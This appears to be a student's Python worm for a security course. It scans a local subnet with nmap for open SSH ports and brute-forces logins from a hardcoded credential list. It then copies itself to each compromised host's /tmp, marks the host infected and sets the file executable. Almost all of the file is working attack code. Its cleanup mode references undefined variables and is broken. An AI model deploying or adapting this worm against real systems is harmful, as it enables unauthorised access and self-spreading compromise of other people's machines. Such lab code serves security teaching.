#!/usr/bin/python3.6

#Script for CPSC 456, by Hasib Ziai

import paramiko
import sys
import socket
import nmap
import netinfo
import os
import socket, fcntl, struct
import netifaces


# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem(*sshClient):
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected).
	#
	# Done!
	boolInfectedFlag = False
	if not sshClient:
		boolInfectedFlag = os.path.exists(INFECTED_MARKER_FILE)
	else:
		sftpClient = sshClient[0].open_sftp()
		try:
                        sftpClient.stat(INFECTED_MARKER_FILE)
                        boolInfectedFlag = True
		except IOError:
			
			boolInfectedFlag = False

	return boolInfectedFlag
	
	

#################################################################
# Marks the system as infected
#################################################################
def markInfected(*sshClient):
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	#
	# done!
	
	open('infected.txt', 'w+').close()
	cwd = os.getcwd()
	if not sshClient:
		os.rename(cwd + '/infected.txt', INFECTED_MARKER_FILE)

	else:
		sftpClient = sshClient[0].open_sftp()
		sftpClient.put(cwd + '/infected.txt', '/tmp/infected.txt')
		os.remove(cwd + '/infected.txt')

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	current = os.getcwd()
	sftpClient = sshClient.open_sftp()
	sftpClient.put(current + "/worm.py", "/tmp/worm.py")
	sshClient.exec_command("chmod a+x /tmp/worm.py")

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).

        try:
                sshClient.connect(hostname=host, username=userName, password=password)
                return 0
        except paramiko.ssh_exception.AuthenticationException:
                print('Authentication has Failed\n')
                return 1
        except paramiko.ssh_exception.SSHException:
                print('Error when attempting connection to host\n')
                return 3

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system.
		if tryCredentials(host, username, password, ssh) == 0:
                        attemptResults = [ssh, username, password]
                        break

	# Could not find working credentials
	return attemptResults	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP():
	
	networkInterfaces = netifaces.interfaces()

	ipAddr = None
	
	for netFace in networkInterfaces:
		addr = netifaces.ifaddresses(netFace)[2][0]['addr']
		if not addr == "127.0.0.1":
			ipAddr = addr
			break
	
	return ipAddr


#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	

	portScanner = nmap.PortScanner()

        # Scan the network for systems whose
        # port 22 is open (that is, there is possibly
        # SSH running there).
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

        # Scan the network for host
	hostInfo = portScanner.all_hosts()

        # The list of hosts that are up.
	liveHosts = []

        # Go trough all the hosts returned by nmap
        # and remove all who are not up and running
	for host in hostInfo:

                # Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)

	return liveHosts



def cleaner(*sshClient):
	
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	if not sshClient:
		if isInfectedSystem():
			os.remove(INFECTED_MARKER_FILE)
	else:   
		if isInfectedSystem(sshClient[0]):
			sftp = sshClient[0].open_sftp()
			filesOfVictim = sftp.listdir('/tmp/')
			for file in filesOfVictim:
				if file == 'infected.txt' or file == 'worm.py':
					sftp.remove('/tmp/' + file)

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP.
        
if len(sys.argv) < 2: 

	# TODO: Get the IP of the current system
	myIpAddr = getMyIP()

	# Get the hosts on the same network
	networkHosts = getHostsOnTheSameNetwork()

	# TODO: Remove the IP of the current system
	# from the list of discovered systems (we
	# do not want to target ourselves!).

	print("Found hosts: ", networkHosts)



	# Go through the network hosts
	for host in networkHosts:
	
		# Try to attack this host
		sshInfo =  attackSystem(host)
	
		print(sshInfo)
		print("\n")
	
	
		# Did the attack succeed?
		if sshInfo:
		
			print("Trying to spread")
		
			# TODO: Check if the system was	
			# already infected. This can be
			# done by checking whether the
			# remote system contains /tmp/infected.txt
			# file (which the worm will place there
			# when it first infects the system)
			# This can be done using code similar to
			# the code below:
			# try:
			#	 remotepath = '/tmp/infected.txt'
			#        localpath = '/home/cpsc/'
			#	 # Copy the file from the specified
			#	 # remote path to the specified
			# 	 # local path. If the file does exist
			#	 # at the remote path, then get()
			# 	 # will throw IOError exception
			# 	 # (that is, we know the system is
			# 	 # not yet infected).
			# 
			#        sftp.get(filepath, localpath)
			# except IOError:
			#       print "This system should be infected"
			#
			#
			# If the system was already infected proceed.
			# Otherwise, infect the system and terminate.
			# Infect that system
			if not isInfectedSystem(sshInfo[0]):
				spreadAndExecute(sshInfo[0])
				markInfected(sshInfo[0])
				print('Spreading complete\n')
				print('The system with IP Address ' + host + ' has been infected\n')

			else:
				print('Spread has failed')
				print(host + ' is already infected!\n')

if len(sys.argv) == 2:
	if sys.argv[1] == '--clean':
                
                        if isInfectedSystem(sshInfo[0]):
                                print(host +' is infected\n')
                                print('Attempting to clean worm from ' + host + '\n')
                                cleaner(sshInfo[0])
                                print('Host is now CLEAN!\n')

	else:
		print('Usage: \n')
		print('./worm.py --clean')
		print('\n')
